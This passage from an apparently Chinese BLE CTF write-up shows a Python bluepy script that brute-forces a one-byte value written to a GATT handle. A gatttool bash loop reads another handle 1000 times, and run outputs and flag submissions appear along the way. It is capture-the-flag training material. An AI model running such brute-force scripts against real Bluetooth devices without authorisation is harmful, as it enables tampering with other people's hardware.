btle.ADDR_TYPE_PUBLIC       <span class="comment"># 地址类型</span></span><br><span class="line">TARGET_HANDLE = <span class="number">0x003c</span>                  <span class="comment"># 要写入和检查的句柄 (十六进制)</span></span><br><span class="line">INITIAL_VALUE = <span class="string">b&quot;Brute force my value 00 to ff&quot;</span> <span class="comment"># 句柄的初始值 (bytes 类型)</span></span><br><span class="line">SLEEP_INTERVAL = <span class="number">0.05</span>                   <span class="comment"># 每次写入后的暂停时间（秒），可调整</span></span><br><span class="line">RECONNECT_DELAY = <span class="number">2</span>                     <span class="comment"># 尝试重连前的等待时间（秒）</span></span><br><span class="line">WRITE_TIMEOUT_DEFAULT = <span class="number">1.0</span>             <span class="comment"># 默认写入超时（bluepy内部使用）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Target: <span class="subst">&#123;DEVICE_ADDRESS&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Target Handle: <span class="subst">&#123;<span class="built_in">hex</span>(TARGET_HANDLE)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Initial Expected Value: <span class="subst">&#123;INITIAL_VALUE!r&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">conn = <span class="literal">None</span>         <span class="comment"># 初始化连接对象</span></span><br><span class="line">found_value = <span class="literal">None</span>  <span class="comment"># 用于存储找到的正确值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connecting...&quot;</span>)</span><br><span class="line">    conn = btle.Peripheral(DEVICE_ADDRESS, ADDR_TYPE)</span><br><span class="line">    <span class="comment"># conn.setSecurityLevel(&quot;medium&quot;) # 如果需要配对，可能需要设置安全级别</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connected.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 主循环：暴力破解 0x00 到 0xFF ---</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>): <span class="comment"># 0 到 255</span></span><br><span class="line">        value_to_try = i</span><br><span class="line">        hex_value_str = <span class="string">f&quot;<span class="subst">&#123;value_to_try:02x&#125;</span>&quot;</span>      <span class="comment"># 用于打印的十六进制字符串</span></span><br><span class="line">        data_byte = <span class="built_in">bytes</span>([value_to_try])        <span class="comment"># 要写入的单字节 bytes 对象</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Trying value: <span class="subst">&#123;<span class="built_in">hex</span>(value_to_try)&#125;</span> (Hex: <span class="subst">&#123;hex_value_str&#125;</span>, Bytes: <span class="subst">&#123;data_byte!r&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># --- 执行写入 ---</span></span><br><span class="line">            <span class="comment"># 使用 withResponse=True 尝试 Write Request</span></span><br><span class="line">            conn.writeCharacteristic(TARGET_HANDLE, data_byte, withResponse=<span class="literal">True</span>)</span><br><span class="line">            <span class="comment"># print(&quot;  Write request sent successfully (protocol level).&quot;) # 可以取消注释用于调试</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># --- 成功检查：读取同一个句柄的值 ---</span></span><br><span class="line">            <span class="comment"># 等待一小段时间让设备处理</span></span><br><span class="line">            time.sleep(SLEEP_INTERVAL)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 读取当前句柄的值</span></span><br><span class="line">            current_value = conn.readCharacteristic(TARGET_HANDLE)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  -&gt; Value read back from <span class="subst">&#123;<span class="built_in">hex</span>(TARGET_HANDLE)&#125;</span>: <span class="subst">&#123;current_value!r&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检查值是否已经改变 (不再是初始值)</span></span><br><span class="line">            <span class="keyword">if</span> current_value != INITIAL_VALUE:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;!!! SUCCESS: Handle <span class="subst">&#123;<span class="built_in">hex</span>(TARGET_HANDLE)&#125;</span> value changed!           !!!&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;!!! Correct value likely: <span class="subst">&#123;<span class="built_in">hex</span>(value_to_try)&#125;</span> (Hex: <span class="subst">&#123;hex_value_str&#125;</span>)        !!!&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;!!! New value in handle: <span class="subst">&#123;current_value!r&#125;</span> !!!&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n&quot;</span>)</span><br><span class="line">                found_value = value_to_try</span><br><span class="line">                <span class="keyword">break</span> <span class="comment"># 找到正确值，退出循环</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> btle.BTLEException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># --- 处理写入或读取错误 ---</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  -&gt; FAILED for value <span class="subst">&#123;<span class="built_in">hex</span>(value_to_try)&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检查是否是连接丢失错误</span></span><br><span class="line">            connection_lost = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 尝试发送一个无操作的请求（如读取RSSI）来检查连接状态</span></span><br><span class="line">                conn.getrssi()</span><br><span class="line">            <span class="keyword">except</span> btle.BTLEDisconnectError:</span><br><span class="line">                connection_lost = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">except</span> btle.BTLEException:</span><br><span class="line">                <span class="comment"># 其他蓝牙错误也可能意味着连接问题</span></span><br><span class="line">                connection_lost = <span class="literal">True</span> <span class="comment"># 保守假设连接可能丢失</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> connection_lost:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Connection lost, attempting to reconnect...&quot;</span>)</span><br><span class="line">                time.sleep(RECONNECT_DELAY)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    conn.connect(DEVICE_ADDRESS, ADDR_TYPE)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Reconnected successfully.&quot;</span>)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> recon_e:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Reconnect failed: <span class="subst">&#123;recon_e&#125;</span>. Aborting.&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span> <span class="comment"># 重连失败，放弃</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 如果不是连接丢失错误，可能是写入不允许或其他错误，继续下一个尝试</span></span><br><span class="line">                <span class="comment"># print(&quot;  Continuing to next value...&quot;)</span></span><br><span class="line">                <span class="comment"># 短暂暂停避免过于频繁的无效尝试</span></span><br><span class="line">                time.sleep(SLEEP_INTERVAL * <span class="number">2</span>) <span class="comment"># 错误后暂停时间稍长</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 防止循环过快占用过多 CPU</span></span><br><span class="line">        time.sleep(SLEEP_INTERVAL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> btle.BTLEDisconnectError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nError: Disconnected during operation: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> btle.BTLEException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nError: Bluetooth operation failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nOperation cancelled by user.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nAn unexpected error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># --- 清理：确保断开连接 ---</span></span><br><span class="line">    <span class="keyword">if</span> conn:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Disconnecting...&quot;</span>)</span><br><span class="line">            conn.disconnect()</span><br><span class="line">        <span class="keyword">except</span> btle.BTLEException:</span><br><span class="line">            <span class="comment"># 可能已经断开连接，忽略错误</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 结果报告 ---</span></span><br><span class="line"><span class="keyword">if</span> found_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nBrute force finished. The correct value appears to be: <span class="subst">&#123;<span class="built_in">hex</span>(found_value)&#125;</span> (Decimal: <span class="subst">&#123;found_value&#125;</span>)&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>) <span class="comment"># 成功退出</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nBrute force finished. The correct value was not found (or the handle value did not change).&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>) <span class="comment"># 失败退出</span></span><br></pre></td></tr></table></figure><p>输出为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Trying value: 0xd0 (Hex: d0, Bytes: b&#x27;\xd0&#x27;)</span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">Value <span class="built_in">read</span> back from 0x3c: b<span class="string">&#x27;Brute force my value 00 to ff&#x27;</span></span></span><br><span class="line">Trying value: 0xd1 (Hex: d1, Bytes: b&#x27;\xd1&#x27;)</span><br><span class="line"><span class="meta prompt_">  -&gt; </span><span class="language-bash">Value <span class="built_in">read</span> back from 0x3c: b<span class="string">&#x27;933c1fcfa8ed52d2ec05&#x27;</span></span></span><br><span class="line"></span><br><span class="line">!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">!!! SUCCESS: Handle 0x3c value changed!           !!!</span><br><span class="line">!!! Correct value likely: 0xd1 (Hex: d1)        !!!</span><br><span class="line">!!! New value in handle: b&#x27;933c1fcfa8ed52d2ec05&#x27; !!!</span><br><span class="line">!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line"></span><br><span class="line">Disconnecting...</span><br><span class="line"></span><br><span class="line">Brute force finished. The correct value appears to be: 0xd1 (Decimal: 209)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进行验证</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;933c1fcfa8ed52d2ec05&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:9 /20</span><br></pre></td></tr></table></figure><h2 id="0x10-多次读"><a href="#0x10-多次读" class="headerlink" title="0x10 多次读"></a>0x10 多次读</h2><p>%% 看看 Handle 0x003e 并按照它所说的去做。请记住，某些工具在执行读取和写入时比其他工具具有更好的连接速度。这与该工具提供的功能或它如何在主机 OS 上使用缓存的 BT 连接有关。尝试针对此标志测试不同的工具。找到最快的一个后，启动脚本或 bash 1 liner 以完成任务。仅供参考，一旦运行，如果作得当，此任务大约需要 90 秒才能完成。 %%<br>读取要求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x003e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>Read me 1000 times<br>读取0x003e一千次</p><h3 id="执行一千次shell操作"><a href="#执行一千次shell操作" class="headerlink" title="执行一千次shell操作"></a>执行一千次shell操作</h3><p>执行一千次shell操作并打印最后十次的结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x003e | awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p; printf &#x27;\n&#x27;</span><br></pre></td></tr></table></figure><p>设定时间为三分钟，一旦出现报错就立即停止</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--- 配置 ---</span></span><br><span class="line">MAC=&quot;64:B7:08:61:B9:7E&quot;</span><br><span class="line">HANDLE=&quot;0x003e&quot;</span><br><span class="line">COUNT=1000</span><br><span class="line">LAST_N=10 # 只打印最后 N 次的结果</span><br><span class="line">READ_TIMEOUT=5 # gatttool 读取超时（秒）</span><br><span class="line">MAX_DURATION_SECONDS=180 # 最大总执行时间（秒），3分钟</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--- 用于存储最后 N 个结果的数组 ---</span></span><br><span class="line">declare -a last_results</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--- 开始时间和计数器 ---</span></span><br><span class="line">start_time=$(date +%s)</span><br><span class="line">completed_reads=0</span><br><span class="line">error_occurred=false</span><br><span class="line"></span><br><span class="line">echo &quot;Starting to read handle $HANDLE from $MAC, $COUNT times...&quot;</span><br><span class="line">echo &quot;(Using gatttool in a loop - this will be VERY SLOW and potentially unstable)&quot;</span><br><span class="line">echo &quot;Max duration set to $MAX_DURATION_SECONDS seconds.&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--- 主循环 ---</span></span><br><span class="line">for (( i=1; i&lt;=COUNT; i++ )); do</span><br><span class="line">    # --- 检查总执行时间 ---</span><br><span class="line">    current_time=$(date +%s)</span><br><span class="line">    elapsed_time=$((current_time - start_time))</span><br><span class="line">    if [ &quot;$elapsed_time&quot; -gt &quot;$MAX_DURATION_SECONDS&quot; ]; then</span><br><span class="line">        echo -e &quot;\nError: Execution time exceeded $&#123;MAX_DURATION_SECONDS&#125; seconds. Stopping.&quot;</span><br><span class="line">        error_occurred=true</span><br><span class="line">        break # 超时则跳出循环</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    # 打印进度 (每 10 次打印一次)</span><br><span class="line">    if (( i % 10 == 0 )) || [ &quot;$i&quot; -eq &quot;$COUNT&quot; ]; then</span><br><span class="line">       printf &quot;\rReading %d/%d (Elapsed: %ds)...&quot; &quot;$i&quot; &quot;$COUNT&quot; &quot;$elapsed_time&quot;</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    # --- 执行命令并捕获输出 ---</span><br><span class="line">    # 捕获标准输出，错误输出丢弃（或重定向到日志文件）</span><br><span class="line">    output=$(gatttool -b &quot;$MAC&quot; --char-read -a &quot;$HANDLE&quot; -t &quot;$READ_TIMEOUT&quot; 2&gt;/dev/null | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p)</span><br><span class="line">    exit_code=$? # 获取管道中最后一个命令(xxd)的退出码？这不一定可靠，最好检查gatttool本身</span><br><span class="line"></span><br><span class="line">    # 更可靠地检查 gatttool 是否成功连接并读取</span><br><span class="line">    # 运行 gatttool 并检查其退出码，忽略解码管道的退出码</span><br><span class="line">    gatttool_output=$(gatttool -b &quot;$MAC&quot; --char-read -a &quot;$HANDLE&quot; -t &quot;$READ_TIMEOUT&quot; 2&gt;&amp;1)</span><br><span class="line">    gatttool_exit_code=$?</span><br><span class="line"></span><br><span class="line">    if [ $gatttool_exit_code -ne 0 ]; then</span><br><span class="line">        # 如果 gatttool 命令本身失败</span><br><span class="line">        echo -e &quot;\nError: gatttool failed on read #$i (Exit code: $gatttool_exit_code). Stopping.&quot;</span><br><span class="line">        echo &quot;       gatttool output: $gatttool_output&quot;</span><br><span class="line">        error_occurred=true</span><br><span class="line">        break # 遇到错误停止</span><br><span class="line">    else</span><br><span class="line">        # gatttool 成功，解码输出</span><br><span class="line">        decoded_output=$(echo &quot;$gatttool_output&quot; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27; | tr -d &#x27; &#x27; | xxd -r -p)</span><br><span class="line"></span><br><span class="line">        # --- 存储结果 ---</span><br><span class="line">        # 将结果添加到数组末尾</span><br><span class="line">        last_results+=(&quot;$decoded_output&quot;)</span><br><span class="line">        # 如果数组超长，移除第一个元素</span><br><span class="line">        if [ $&#123;#last_results[@]&#125; -gt $LAST_N ]; then</span><br><span class="line">            last_results=(&quot;$&#123;last_results[@]:1&#125;&quot;) # Bash 4+ 语法移除第一个元素</span><br><span class="line">        fi</span><br><span class="line">        completed_reads=$i</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    # (可选) 短暂暂停</span><br><span class="line">    # sleep 0.01</span><br><span class="line"></span><br><span class="line">    # 添加 Ctrl+C 中断处理</span><br><span class="line">    trap &quot;echo -e &#x27;\nRead sequence interrupted by user.&#x27;; exit 1&quot; INT</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo # 结束进度条打印，换行</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--- 打印最终结果 ---</span></span><br><span class="line">current_time=$(date +%s)</span><br><span class="line">elapsed_time=$((current_time - start_time))</span><br><span class="line">echo &quot;-----------------------------------------&quot;</span><br><span class="line">echo &quot;Finished.&quot;</span><br><span class="line">echo &quot;Total execution time: $&#123;elapsed_time&#125; seconds.&quot;</span><br><span class="line">echo &quot;Completed reads: $&#123;completed_reads&#125;/$&#123;COUNT&#125;.&quot;</span><br><span class="line"></span><br><span class="line">if [ &quot;$error_occurred&quot; = true ]; then</span><br><span class="line">    echo &quot;Operation stopped due to error or timeout.&quot;</span><br><span class="line">    exit 1</span><br><span class="line">elif [ &quot;$completed_reads&quot; -lt &quot;$COUNT&quot; ]; then</span><br><span class="line">     echo &quot;Operation stopped before completing all reads (likely interrupted).&quot;</span><br><span class="line">     exit 1</span><br><span class="line">else</span><br><span class="line">    echo &quot;Operation completed $COUNT reads.&quot;</span><br><span class="line">    echo &quot;\nLast $LAST_N read values:&quot;</span><br><span class="line">    # 打印存储的最后 N 个结果</span><br><span class="line">    count_to_print=$&#123;#last_results[@]&#125; # 获取实际存储的数量</span><br><span class="line">    if [ $count_to_print -gt 0 ]; then</span><br><span class="line">        start_print_index=$((COUNT - count_to_print + 1))</span><br><span class="line">         # 使用 printf 格式化输出</span><br><span class="line">        for k in &quot;$&#123;!last_results[@]&#125;&quot;; do # 遍历数组索引</span><br><span class="line">            original_index=$((start_print_index + k))</span><br><span class="line">            printf &quot;  Read #%d: %s\n&quot; &quot;$original_index&quot; &quot;$&#123;last_results[$k]&#125;&quot;</span><br><span class="line">        done</span><br><span class="line">    else</span><br><span class="line">        echo &quot;  No results were successfully stored.&quot;</span><br><span class="line">    fi</span><br><span class="line">    echo &quot;-----------------------------------------&quot;</span><br><span class="line">    exit 0 # 成功退出</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>成功，但是用了更多的多的时间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ./test4.sh</span><br><span class="line">Starting to read handle 0x003e from 64:B7:08:61:B9:7E, 1000 times...</span><br><span class="line">(Using gatttool in a loop - this will be VERY SLOW and potentially unstable)</span><br><span class="line">Max duration set to 180 seconds.</span><br><span class="line">Reading 1000/1000 (Elapsed: 161s)...</span><br><span class="line">-----------------------------------------</span><br><span class="line">Finished.</span><br><span class="line">Total execution time: 161 seconds.</span><br><span class="line">Completed reads: 1000/1000.</span><br><span class="line">Operation completed 1000 reads.</span><br><span class="line">\nLast 10 read values:</span><br><span class="line">  Read #991: 6ffcd214ffebdc0d069e</span><br><span class="line">  Read #992: 6ffcd214ffebdc0d069e</span><br><span class="line">  Read #993: 6ffcd214ffebdc0d069e</span><br><span class="line">  Read #994: 6ffcd214ffebdc0d069e</span><br><span class="line">  Read #995: 6ffcd214ffebdc0d069e</span><br><span class="line">  Read #996: 6ffcd214ffebdc0d069e</span><br><span class="line">  Read #997: 6ffcd214ffebdc0d069e</span><br><span class="line">  Read #998: 6ffcd214ffebdc0d069e</span><br><span class="line">  Read #999: 6ffcd214ffebdc0d069e</span><br><span class="line">  Read #1000: 6ffcd214ffebdc0d069e</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进行验证</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-write-req -a 0x002c -n $(echo -n &quot;6ffcd214ffebdc0d069e&quot;|xxd -ps)</span><br><span class="line">Characteristic value was written successfully</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gatttool -b 64:B7:08:61:B9:7E --char-read -a 0x002a|awk -F&#x27;:&#x27; &#x27;&#123;print $2&#125;&#x27;|tr -d &#x27; &#x27;|xxd -r -p;printf &#x27;\n&#x27;</span><br><span class="line">Score:10 /20</span><br></pre></td></tr></table></figure><h3 id="bluepy"><a href="#bluepy" class="headerlink" title="bluepy"></a>bluepy</h3><p>使用bluepy会更快</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span 